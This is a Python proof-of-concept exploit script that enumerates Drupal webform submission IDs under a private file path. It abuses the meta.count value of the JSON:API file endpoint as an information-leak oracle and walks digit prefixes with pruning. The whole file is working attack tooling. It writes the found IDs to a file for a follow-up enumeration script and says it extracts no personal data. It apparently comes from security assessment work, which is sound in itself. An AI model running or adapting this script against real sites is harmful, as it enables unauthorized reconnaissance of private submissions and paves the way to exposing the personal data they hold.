#!/usr/bin/env python3
"""
PoC — enumeration of submission IDs (the 10001 in
private://webform/private_path/10001/) via the meta.count oracle.

The UUIDs leaked through meta.omitted.links do NOT reveal the path: the sid must be
reconstructed. Method: walk the tree of digit prefixes, with two prunings that roughly
halve the cost compared to a naive sweep.

Extracts no personal data: numbers only.

Output: one sid per line, ready to feed to enum-submission-ids.py via -d.

Usage :
    ./enum-submission-ids.py <form> [prefix] [-o FILE]

    ./enum-submission-ids.py private_path              full tree (expensive)
    ./enum-submission-ids.py private_path 10           only sids starting with 10
    ./enum-submission-ids.py private_path -o sids.txt  write results to sids.txt
"""
import argparse, datetime, json, sys, urllib.parse, urllib.request

_reqs = 0
API   = None   # set at startup from --url


def count(prefix):
    global _reqs
    _reqs += 1
    q = {'filter[uri.value][operator]': 'STARTS_WITH',
         'filter[uri.value][value]': prefix,
         'page[limit]': '0'}
    with urllib.request.urlopen(API + '?' + urllib.parse.urlencode(q), timeout=25) as r:
        return json.loads(r.read().decode())['meta']['count']


def walk(base, digits, total, found, out, max_len=6):
    """Walk the prefix tree. `total` = number of files under `base+digits`.

    Pruning 1: a branch with 0 files is not explored.
    Pruning 2: once the explored branches sum up to `total`, the remaining digits
               are necessarily empty — stop without testing them.
    """
    # does a directory exist at exactly this number?
    if digits:
        here = count(f'{base}{digits}/')
        if here:
            found.append((digits, here))
            if out:
                out.write(digits + '\n')
                out.flush()          # written as we go: an interrupt keeps what's found
            print(f'   sid={digits:<8} files={here:<4} (requests: {_reqs})', flush=True)
    else:
        here = 0

    if len(digits) >= max_len:
        return
    seen = here
    for d in '0123456789':
        if seen >= total:        # pruning 2: nothing left to find under this prefix
            break
        c = count(f'{base}{digits}{d}')
        if c:
            seen += c
            walk(base, digits + d, c, found, out, max_len)


def main():
    global API
    ap = argparse.ArgumentParser(
        description="Enumerate Drupal webform submission IDs via the meta.count oracle (JSON:API).")
    ap.add_argument('form', help='machine name of the target webform (e.g. private_path)')
    ap.add_argument('prefix', nargs='?', default='',
                    help='restrict the walk to sids starting with this digit prefix')
    ap.add_argument('-o', '--output', default='sids.txt', metavar='FILE',
                    help='output file, one sid per line (default: sids.txt)')
    ap.add_argument('-u', '--url', default='https://www.domain.local',
                    help='target base URL (default: https://www.domain.local)')
    ap.add_argument('-m', '--max-len', type=int, default=6,
                    help='max number of digits in a sid (default: 6)')
    args = ap.parse_args()

    API  = args.url.rstrip('/') + '/fr/jsonapi/file/file'
    base = f'private://webform/{args.form}/'

    total = count(base + args.prefix)
    print(f'[+] target : {API}')
    print(f'[+] base   : {base}{args.prefix}')
    print(f'[+] total  : {total} files')
    print(f'[+] output : {args.output}\n')

    if total == 0:
        print('[!] nothing under this prefix — check the form name or prefix')
        return

    found = []
    with open(args.output, 'w', encoding='utf-8') as out:
        out.write(f'# form={args.form} prefix={args.prefix or "(all)"} '
                  f'date={datetime.date.today().isoformat()}\n')
        walk(base, args.prefix, total, found, out)

    sids = sorted((f for f, _ in found), key=lambda s: (len(s), s))
    print(f'\n[+] {len(found)} submissions found, {_reqs} requests')
    print(f'[+] sids written to {args.output}')
    print('[+] sids:', sids)


if __name__ == '__main__':
    main()